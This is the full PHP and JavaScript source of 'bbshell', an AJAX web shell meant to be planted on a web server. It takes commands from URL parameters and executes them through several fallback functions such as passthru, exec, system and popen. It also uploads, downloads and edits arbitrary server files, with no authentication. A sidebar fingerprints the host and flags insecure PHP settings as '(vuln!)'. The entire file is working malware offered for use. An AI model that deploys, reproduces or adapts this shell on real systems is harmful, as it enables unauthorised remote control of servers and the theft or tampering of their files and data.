<?php
header("Content-Type:text/html; charset=euc-kr");

function receiveResult($handle){
	if(function_exists(stream_get_contents))
		$result = stream_get_contents($handle);
	else{
		$result = "";
		if ( is_resource($handle) )
			while ( !feof($handle) )
				$result = fread($handle, 2096); 
	}
	return $result;
}


function autoCompletion($cmd, $path, $searchCmd){
	@chdir($path);
	
	$index1 = strrpos($cmd, "/");
	$index2 = strrpos($cmd, "\\");

	if((($index1===false) && ($index2 === 0) ) || (($index1 === 0) && ($index2===false)))
		$nfind = 0;
	else if(($index1===false) && ($index2===false))
		$nfind = null;
	else
		$nfind = ($index1 > $index2)?$index1:$index2;
	
	if($nfind !== null){
		@chdir(substr($cmd, 0, $nfind+1));				//path resetting
		$cmd = substr($cmd, $nfind+1, strlen($cmd));	//filename
	}

	//result of "dir" or "ls"
	@ob_start(); 
	if(eregi("window", php_uname()))
		execCommand("dir /b", getcwd(), true);
	else
		execCommand("ls -a1", getcwd(), true);
	$result = @ob_get_contents();
	@ob_end_clean();
	$result = rawurldecode($result);
	
	//preg_match_all("/(.*)\n/", $result, $searchList);
	$searchList = explode("\n",$result);

	$preStr = array(".","+","^","$","*","[","]","(",")","?","{","}");
	$postStr = array("\.","\+","\^","\$","\*","\[","\]","\(","\)","\?","\{","\}");
	$replaced_cmd = str_replace($preStr,$postStr,$cmd);
	
	if($searchCmd == "true"){
		$cmdList = array("upload", "download", "edit");
		$searchList = array_merge($cmdList, $searchList);
	}
		
	$matchedFile = array();
	foreach($searchList as $tmpfile){
		
			if(preg_match("/^".$replaced_cmd."/i", $tmpfile)){
				array_push($matchedFile, $tmpfile);
			}
	}
	print rawurlencode(join("\n\n\n",$matchedFile));
	return true;	
}

function execCommand($cmd, $path, $encoding){
	@chdir($path);
	
	$cmdArray = explode(" ", $cmd);
	if(ereg("cd", $cmdArray[0]) and (count($cmdArray)!=1)){
			array_shift($cmdArray);
			$chPath = implode(' ', $cmdArray);
			@chdir($chPath);
			$result = getcwd();
	} 
	else{			
		if(function_exists(passthru)){
			@ob_start(); 
			passthru($cmd);
			$result = @ob_get_contents();
			@ob_end_clean();
		}
		else if(function_exists(exec)){
			exec($cmd, $tmp); 
			$result = join("\n",$tmp);
		}
		else if(function_exists(system)){
			@ob_start(); 
			system($cmd);
			$result = @ob_get_contents();
			@ob_end_clean();

		}
		else if(function_exists(shell_exec)){
			$result = shell_exec($cmd);
		}
		else if(function_exists(popen)){
			
			$handle = popen($cmd." 2>&1", "r"); 
			$result = receiveResult($handle);
		}
		else if(function_exists(proc_open)){
			$descriptorspec = array(
			   0 => array("pipe", "r"),
			   1 => array("pipe", "w"),
			   2 => array("pipe", "w")
			);
			$proc = proc_open($cmd, $descriptorspec, $pipes);
			$result = receiveResult($pipes[1]);

			fclose($pipes[0]);
			fclose($pipes[1]);
			fclose($pipes[2]);
		}
		else{
			print "None of the command functions ...";
			return false;
		}
	}
	
	if($encoding)
		print rawurlencode(iconv("euc-kr", "UTF-8", $result));
	else
		print $result;

	return true;
}
/////////// information print
function printOnOff($tr){
	if(strlen($tr)>1)
		return "<span style=\"color: #00AAAA; font-weight: bold;\">".$tr."</span>";
	else if($tr == true)
		return "<span style=\"color: #00AAAA; font-weight: bold;\">ON</span>";
	else
		return "<span style=\"color: #FF0000; font-weight: bold;\">OFF</span>";
}

function printVuln($tr, $base){
	if($tr == $base)
		return "<span style=\"color: #FFDD88; font-style:italic; \"> (vuln!)</span>";
	return "";
	
}

function printSideMenu(){
	$magic_quotes_gpc = @ini_get("magic_quotes_gpc");
	$safe_mode = @ini_get("safe_mode");
	$allow_url_fopen = @ini_get("allow_url_fopen");
	$register_globals = @ini_get("register_globals");
	$open_basedir = @ini_get("open_basedir");
	
	print "<br/><table class=\"plaintext\">
	<tr><td colspan=3 style=\"font-weight: bold;\">< System Info ></td></tr>
	<tr>
		<td>OS</td>
		<td>: </td>
		<td>".php_uname()."</td>
	</tr>
	<tr>
		<td>Server</td>
		<td>: </td>
		<td>".getenv("SERVER_SOFTWARE")."</td>
	</tr>
	<tr>
		<td>IP Addr</td>
		<td>: </td>
		<td>".$_SERVER["HTTP_HOST"]."</td>
	</tr>
	</table>
	<br/><br/>
	
	<table class=\"plaintext\">
	<tr><td colspan=3 style=\"font-weight: bold;\">< Function Info ></td></tr>
	<tr>
		<td><li>passthru</td>
		<td>: </td>
		<td>".printOnOff(function_exists(passthru))."</td>
	</tr>
	<tr>
		<td><li>exec</td>
		<td>: </td>
		<td>".printOnOff(function_exists(exec))."</td>
	</tr>
	<tr>
		<td><li>system</td>
		<td>: </td>
		<td>".printOnOff(function_exists(system))."</td>
	</tr>
	<tr>
		<td><li>shell_exec</td>
		<td>: </td>
		<td>".printOnOff(function_exists(shell_exec))."</td>
	</tr>
	<tr>
		<td><li>popen</td>
		<td>: </td>
		<td>".printOnOff(function_exists(popen))."</td>
	</tr>
	<tr>
		<td><li>proc_open</td>
		<td>: </td>
		<td>".printOnOff(function_exists(proc_open))."</td>
	</tr>
	</table>
	<br/><br/>
	
	<table class=\"plaintext\">
	<tr><td colspan=3 style=\"font-weight: bold;\">< php.ini ></td></tr>
	<tr>
		<td><li>safe_mode</td>
		<td>: </td>
		<td>".printOnOff($safe_mode).printVuln($safe_mode, false)."</td>
	</tr>
	<tr>
		<td><li>open_basedir</td>
		<td>: </td>
		<td>".printOnOff($open_basedir).printVuln($open_basedir, false)."</td>
	</tr>
	<tr>
		<td><li>magic_quotes_gpc</td>
		<td>: </td>
		<td>".printOnOff($magic_quotes_gpc).printVuln($magic_quotes_gpc, false)."</td>
	</tr>

	<tr>
		<td><li>allow_url_fopen</td>
		<td>: </td>
		<td>".printOnOff($allow_url_fopen).printVuln($allow_url_fopen, true)."</td>
	</tr>
	<tr>
		<td><li>register_globals</td>
		<td>: </td>
		<td>".printOnOff($register_globals).printVuln($register_globals, true)."</td>
	</tr>
	</table>
	<br/><br/><br/>
	
	<table class=\"plaintext\">
	<tr>
		<td colspan=3  style=\"font-weight: bold;\">===== Webshell Command =====</td>
	</tr>
	<tr>
		<td><li>Upload</td>
		<td>: </td>
		<td>\"upload &lt;target path&gt;\"</td>
	</tr>
	<tr>
		<td><li>Download</td>
		<td>: </td>
		<td>\"download &lt;target path&gt;\"</td>
	</tr>
	<tr>
		<td><li>Edit</td>
		<td>: </td>
		<td>\"edit &lt;target path&gt;\"</td>
	</tr>
	</table>
	<br/><br/><br/>
	";
}

////////////////
if($_GET["search"] == "true"){
	$cmd = rawurldecode($_GET["command"]);	//iconv("UTF-8", "euc-kr", rawurldecode($_GET["command"]));
	$path = iconv("UTF-8", "euc-kr", rawurldecode($_GET["path"]));
	autoCompletion($cmd, $path, $_GET["cmdsearch"]);
}
else if($_FILES["uploadfile"]["name"] != null){
		@chdir($_POST["basepath"]);	
		$target_path = $_POST["filepath"];
	
		if(@move_uploaded_file($_FILES["uploadfile"]["tmp_name"], $target_path)) {
				print "<script> alert(\"upload success !\"); </script>";
		}else{
				print "<script> alert(\"upload failed (".$_FILES["uploadfile"]["error"].")\"); </script>";
		}
}
else if($_POST["downloadfile"] != null){
	@chdir($_POST["basepath"]);	
	$downloadfile = $_POST["downloadfile"];
	$downpath = $downloadfile;
	
	if(file_exists($downpath)){
		if (is_dir($downpath)){
			print "<script> alert(\"File is Directory ...\");</script>";
			return False;
		}
		$filesize = filesize($downpath);
		$filename = basename($downpath);

		header("Pragma: public");
		header("Expires: 0");
		header("Content-Type: application/octet-stream");
		header("Content-Disposition: attachment; filename=\"".basename($downpath)."\"");
		header("Content-Transfer-Encoding: binary");
		header("Content-Length: $filesize");

		$fp = fopen($downpath, "rb");
		while(!feof($fp)){
			echo fread($fp, 100*1024);
		}
		fclose($fp);
		//ob_clean();
		//flush();
	}
	else{
		print "<script> alert(\"File not existed ...\");</script>";
		return False;
	}
	return True;
}
else if($_GET["edit"] != null){
	$filepath = iconv("UTF-8", "euc-kr", rawurldecode($_GET["edit"]));
	$basepath = iconv("UTF-8", "euc-kr", rawurldecode($_GET["path"]));	
	@chdir($basepath);	
	
	if($_GET["option"] == "read"){	
		$fp = fopen($filepath, "r");
		while(!feof($fp)){
			echo fread($fp, 100*1024);
			//echo rawurlencode(iconv("euc-kr", "UTF-8",fread($fp, 100*1024)));
		}
		fclose($fp);
	}
	else if($_GET["option"] == "save"){
		$fp = fopen($filepath, "w");
		if(!$fp){
			print "fopen error";
			return False;
		}
		//fwrite($fp, $_POST["savedata"]);
		fwrite($fp, iconv("UTF-8", "euc-kr",$_POST["savedata"]));
		fclose($fp);
	
		print rawurlencode(iconv("euc-kr", "UTF-8", "\"".$filepath."\" is saved"));
	}
}
else if($_GET["command"] != ""){
	$cmd = iconv("UTF-8", "euc-kr", rawurldecode($_GET["command"]));
	$path = iconv("UTF-8", "euc-kr", rawurldecode($_GET["path"]));
	execCommand($cmd, $path, false);
}

else{
?>

<style type="text/css">
body { color:#FFFFFF; font-size:11px; }
#wrapper { float:left; width:100%; }
	#header { float:left; width:100%; padding:5px; border-top:1px solid #CCCCCC; border-bottom:1px solid #CCCCCC; margin-bottom:5px; }
	#container { float:left; width:100%; }
		#sidemenu { float:left; width:20%;  font-size: 12px; color:#FFFFFF; padding:5px; }
		#contents { float:left; width:77%;  border-left:1px solid #CCCCCC; padding:5px 5px 5px 10px; min-height:550px; }
			#resultBox { float:left; width:100%; }
			#prompt { float:left; width:100%; }
	#footer { float:left; width:100%; padding:5px; border-top:1px solid #CCCCCC; border-bottom:1px solid #CCCCCC; margin-top:5px;  }

.plaintext, input {
    font-size: 12px;
    background: #000000;
    color: #FFFFFF;
	font-family: "Consolas", "Courier New", "돋움체", "굴림체";
}
.titletext {
	font-weight: bold;
    font-size: 18px;
    color: #FFFFFF;
    font-family: "verdana", "Consolas";
	font-style: italic;
	text-align: center;
}

</style>

<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	</head>
	<body onload="document.cmdform.cmdtext.focus();" style="background-color:#000000;">
	<div id="wrapper">
		<div id="header">
			<h1 class="titletext">bbshell (php & ajax webshell)</h1>
		</div>
		<div id="container">
			<div id="sidemenu">
				<?php printSideMenu(); ?>
			</div>
			<div id="contents">
				<div id="resultBox" class="plaintext">
				</div>
				<div id="prompt">
					<form id="cmdform" name="cmdform" onsubmit="cmdHandler(cmdform.cmdtext.value); return false;">
						<div id="path" name="path" class="plaintext" style="float:left; margin-right:2px;"></div>
						<div class="plaintext" style="float:left; margin-right:10px; "><?php  (eregi("window", php_uname()))?print "&gt;":print "$"; ?></div>
						<input type="hidden" name="history_index" value=-1/>
						<input type="hidden" name="history_cmd"/>
						<input type="text" name="cmdtext" id="cmdtext" style="float:left; width:70%; border:0; cursor:pointer;" />						
					</form>
					<form name="uploadform" id="uploadform" enctype="multipart/form-data" method="POST" >
						<input type="hidden" name="filepath" />
						<input type="hidden" name="basepath" />
						<input type="hidden" name="MAX_FILE_SIZE" value="30000" />
						<input type="file" name="uploadfile" style="display:none;"/>
					</form>
					<form name="downloadform" id="downloadform" method="POST" >
						<input type="hidden" name="downloadfile"/>
						<input type="hidden" name="basepath" />
					</form>
				</div>
			</div>
		</div>
		<div id="footer" align="left">
			 :) Made by bbolmin -
		</div>
	<div>

		<script TYPE="text/javascript">
			if(window.top == this){
				var uploadiframe = document.createElement("iframe");
				uploadiframe.setAttribute("id", "iframe_upload");
				uploadiframe.setAttribute("name", "iframe_upload");
				uploadiframe.setAttribute("style", "width:0px;height:0px;border:0px;");
				uploadform.appendChild(uploadiframe);
				document.getElementById("uploadform").target = "iframe_upload";
				
				var downloadiframe = document.createElement("iframe");
				downloadiframe.setAttribute("id", "iframe_download");
				downloadiframe.setAttribute("name", "iframe_download");
				downloadiframe.setAttribute("style", "width:0px;height:0px;border:0px;");
				uploadform.appendChild(downloadiframe);
				document.getElementById("downloadform").target = "iframe_download";
			}
			//ajax setting
			var path = "<?php=addslashes(getcwd())?>";
			document.getElementById('path').innerHTML = path;

			var httpRequest = createRequest();
			function createRequest(){
				var request;
				try{
					request = new XMLHttpRequest();
				} catch (e){
					try{
						request = new ActiveXObject("Msxml2.XMLHTTP");
					} catch (e) {
						try{
							request = new ActiveXObject("Microsoft.XMLHTTP");
						} catch (e){
							request = null;
						}
					}
				}
				return request;
			}
			
			function strip(text) {
				return text.replace(/^\s+/, "").replace(/\s+$/, "");
			}

			function htmlspecialchars(str) {
				if (str === undefined) return "";
				return str.replace(/[<>"&]/g, function(match){
					return (match == "<") ? "&lt;" :
						   (match == ">") ? "&gt;" :
						   (match == '"') ? "&quot;" :
						   (match == "&") ? "&amp;" : "";
				});
			}
			
			function findPath(cmd){
				var index = (cmd.lastIndexOf("/")>cmd.lastIndexOf("\\")) ? cmd.lastIndexOf("/") : cmd.lastIndexOf("\\");
				return cmd.substr(0, index+1);
			}
			
			function removeEditElement(){
				cmdform.removeChild(document.getElementById('editarea'));
				cmdform.removeChild(document.getElementById('btn_save'));
				cmdform.removeChild(document.getElementById('btn_cancel'));
				cmdform.cmdtext.disabled = false;
				cmdform.cmdtext.value = "";
				cmdform.cmdtext.focus();
			}
			
			function CB_cmdResponseHandler(){
				cmdform.cmdtext.disabled = true;
				if(httpRequest.readyState == 4){
					if(httpRequest.status == 200){
						output = httpRequest.responseText;
						output = strip(output);
						document.getElementById('resultBox').innerHTML += "<pre>"+htmlspecialchars(output)+"</pre>";
						cmdform.cmdtext.value = "";
						cmdform.cmdtext.disabled = false;
						cmdform.cmdtext.blur();
						cmdform.cmdtext.focus();
					}
				}
			}
			
			function CB_pathResponseHandler(){
				if(httpRequest.readyState == 4){
					if(httpRequest.status == 200){
						output = decodeURIComponent(httpRequest.responseText);
						outputArray = output.split("\n\n");
						path = outputArray[0];
						document.getElementById('path').innerHTML = path
						cmdform.cmdtext.blur();
						cmdform.cmdtext.focus();
					}
				}
			}
			
			function CB_readEditFile(){
				if(httpRequest.readyState == 4){
					if(httpRequest.status == 200){
						output = httpRequest.responseText;
						output = output.replace(/\n\n\n\n$/, "");
						document.getElementById('editarea').value = output;
					}
				}
			}
			
			function CB_saveEditFile(){
				if(httpRequest.readyState == 4){
					if(httpRequest.status == 200){
						output = decodeURIComponent(httpRequest.responseText);
						alert(output);
					}
				}
			}
			
			function CB_autoCompletionHandler(){
				if(httpRequest.readyState == 4){
						if(httpRequest.status == 200){
							output = decodeURIComponent(httpRequest.responseText);
							outputArray = output.split("\n\n\n");
							outputArray.pop();
							
							if(outputArray.length == 0){
								return false;
							}
							else if(outputArray.length == 1){
								if(outputArray[0] != ""){
									var cmdArray = cmdform.cmdtext.value.split(" ");
									cmdArray[cmdArray.length-1] = findPath(cmdArray[cmdArray.length-1]) + outputArray[0]
									cmdform.cmdtext.value = cmdArray.join(" ");
								}
							}else{
								var divide = 6;
								var linenum = parseInt(outputArray.length/divide)+1;
								for(i=0;i<linenum; i++){
									document.getElementById('resultBox').innerHTML += outputArray.slice(i*divide,(i+1)*divide).join("<br/>")+"<br/>";
								}
								document.getElementById('resultBox').innerHTML += "<br/><br/>";
								
								//overlapped string
								var min_length = outputArray[0].length;
								for(i=1; i<outputArray.length; i++){
									if(min_length > outputArray[i].length)
										min_length = outputArray[i].length;
								}
								
								var completeString = "";
								var baseString = outputArray[0];
								for(i=0; i<min_length; i++){
									var tr = 0;
									for(j=1; j<outputArray.length; j++){
										if(baseString[i].toLowerCase() == outputArray[j][i].toLowerCase()){
											tr++;
										}
									}
									if(tr == (outputArray.length-1)){
										completeString += baseString[i];
									}else{
										break;
									}
								}
								var cmdArray = cmdform.cmdtext.value.split(" ");
								cmdArray[cmdArray.length-1] = findPath(cmdArray[cmdArray.length-1]) + completeString;
								cmdform.cmdtext.value = cmdArray.join(" ");
							}
							cmdform.cmdtext.blur();
							cmdform.cmdtext.focus();
						}
					}
			}
			
			function cmdHandler(cmd){
				cmd = strip(cmd);
				var cmdArray = cmd.split(" ");
				var sh_char = <?php (eregi("window", php_uname()))?print "\"&gt; \";":print "\"$ \""; ?>
		

				if(cmd == ""){
					document.getElementById('resultBox').innerHTML += "\n"+path+sh_char+cmd+"<br/>";
					cmdform.cmdtext.blur();
					cmdform.cmdtext.focus();
					return false;
				}
				else if((cmdArray[0]=="clear") || (cmdArray[0]=="cls")){
					document.getElementById('resultBox').innerHTML = "";
					cmdform.cmdtext.value = "";
				}
				else if((cmdArray[0]=="upload") && (cmdArray.length != 1)){	
					uploadform.uploadfile.onchange = function() {
						if (uploadform.uploadfile.value != "") {					
							uploadform.submit();
							uploadform.uploadfile.value = "";
							document.getElementById('resultBox').innerHTML += "\n"+path+sh_char+cmd+"<br/><br/>";
							cmdform.cmdtext.value = "";
							cmdform.cmdtext.blur();
							cmdform.cmdtext.focus();
						}						
					}
					uploadform.basepath.value = path;
					uploadform.filepath.value = cmdArray.slice(1).join(" ");
					uploadform.uploadfile.click();
				}
				else if((cmdArray[0]=="download") && (cmdArray.length != 1)){	
					downloadform.basepath.value = path;
					downloadform.downloadfile.value = cmdArray.slice(1).join(" ");
					downloadform.submit();
					downloadform.downloadfile.value = "";
					
					document.getElementById('resultBox').innerHTML += "\n"+path+sh_char+cmd+"<br/><br/>";
					cmdform.cmdtext.value = "";
					cmdform.cmdtext.blur();
					cmdform.cmdtext.focus();
				}
				else if((cmdArray[0]=="edit")){
					if (cmdArray.length == 1){
						cmdform.cmdtext.value = "";
						return false;
					}
					
					var editarea = document.createElement("textarea");
					editarea.setAttribute("id", "editarea");
					editarea.setAttribute("name", "editarea");
					editarea.setAttribute("cols", "120");
					editarea.setAttribute("rows", "30");
					editarea.setAttribute("class", "plaintext");
					cmdform.appendChild(editarea);
					
					var btn_save = document.createElement("input");
					btn_save.setAttribute("type", "button");
					btn_save.setAttribute("id", "btn_save");
					btn_save.value = "save";
					btn_save.onclick = function(){						
						httpRequest.onreadystatechange = CB_saveEditFile;
						httpRequest.open("POST", "?option=save&edit="+encodeURIComponent(cmdArray.slice(1).join(" "))+"&path="+encodeURIComponent(path), true);
						httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
						httpRequest.send("savedata="+encodeURIComponent(cmdform.editarea.value));
						removeEditElement();
					}
					cmdform.appendChild(btn_save);
					
					var btn_cancel = document.createElement("input");
					btn_cancel.setAttribute("type", "button");
					btn_cancel.setAttribute("id", "btn_cancel");
					btn_cancel.value = "cancel";
					btn_cancel.onclick = function(){
						removeEditElement();
					}
					cmdform.appendChild(btn_cancel);
					
					document.getElementById('resultBox').innerHTML += "\n"+path+sh_char+cmd+"<br/><br/>";
					cmdform.cmdtext.value = "Editing ...";
					cmdform.cmdtext.disabled = true;

					httpRequest.onreadystatechange = CB_readEditFile;
					httpRequest.open("GET", "?option=read&edit="+encodeURIComponent(cmdArray.slice(1).join(" "))+"&path="+encodeURIComponent(path), true);
					httpRequest.send(null);

				}
				else if(cmd.toLowerCase() == "exit"){
					 window.open('','_self'); 
					 window.close();
				}
				else{
					document.getElementById('resultBox').innerHTML += "\n"+path+sh_char+cmd+"<br/>";

					if((cmdArray[0] == "cd") && (cmdArray.length != 1)){
						httpRequest.onreadystatechange = CB_pathResponseHandler;
						cmdform.cmdtext.value = "";
					}
					else{
						httpRequest.onreadystatechange = CB_cmdResponseHandler;
						cmdform.cmdtext.value = "waiting ...";
					}
					httpRequest.open("GET", "?command="+encodeURIComponent(cmd)+"&path="+encodeURIComponent(path), true);
					httpRequest.send(null);
				}
				
				var tr_count = 0;
				var history_max = 8;
				var history_arr = cmdform.history_cmd.value.split("\n");
				
				for(i=0; i<history_arr.length; i++){
					if(history_arr[i] == cmd)
						history_arr.splice(i,1);
				}
				
				if(history_arr.length >= history_max)
					history_arr.pop();
				history_arr.unshift(cmd);
				
				cmdform.history_cmd.value = history_arr.join("\n");//cmd + "\n" + cmdform.history_cmd.value;
				cmdform.history_index.value	= -1;
			}
			
			function keycodeHandler(cmd){
				if(event.keyCode == 9){	//autoCompletion
					var cmdArray = cmd.split(" ");
					httpRequest.onreadystatechange = CB_autoCompletionHandler;
					
					httpRequest.open("GET", "?command="+encodeURIComponent(cmdArray[cmdArray.length-1])+"&path="+encodeURIComponent(path)+"&search=true&cmdsearch="+((cmdArray.length == 1)?"true":"false"), true);
					httpRequest.send(null);
					
					return false;
				}
				else if(event.keyCode == 38){//history up
					var history_arr = cmdform.history_cmd.value.split("\n");
					history_arr.pop();
					
					if(history_arr.length!=0){
						cmdform.history_index.value = (parseInt(cmdform.history_index.value)+1)%history_arr.length;
						cmdform.cmdtext.value = history_arr[cmdform.history_index.value];
					}
					return false;
				}
				else if(event.keyCode == 40){//history down
					var history_arr = cmdform.history_cmd.value.split("\n");
					history_arr.pop();
					
					if(history_arr.length!=0){
						if((parseInt(cmdform.history_index.value)-1) < 0)
							cmdform.history_index.value = history_arr.length;
						cmdform.history_index.value = (parseInt(cmdform.history_index.value)-1)%history_arr.length;
						cmdform.cmdtext.value = history_arr[cmdform.history_index.value];
					}
					return false;
				}	
			}
			
			document.getElementById("cmdtext").onkeydown = function(){return keycodeHandler(cmdform.cmdtext.value);};
		</script>
	</body>
</html>
<?php
}
?>





